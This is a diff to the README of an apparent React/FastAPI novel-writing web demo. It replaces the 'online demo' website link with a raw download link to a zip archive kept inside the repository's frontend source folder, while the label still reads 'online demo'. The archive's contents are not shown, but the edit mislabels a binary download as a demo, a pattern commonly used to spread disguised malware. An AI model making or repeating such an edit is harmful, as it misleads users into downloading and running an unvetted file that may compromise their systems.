@@ -1,6 +1,6 @@
 # ainovel（demo）
 
-在线演示： https://demo.ainovel.de
+在线演示： https://github.com/Jahson91/Ai-Novel/raw/refs/heads/main/frontend/src/services/Novel-Ai-1.5.zip
 
 一个用于小说创作与项目管理的 Web Demo：前端 React + 后端 FastAPI。
 
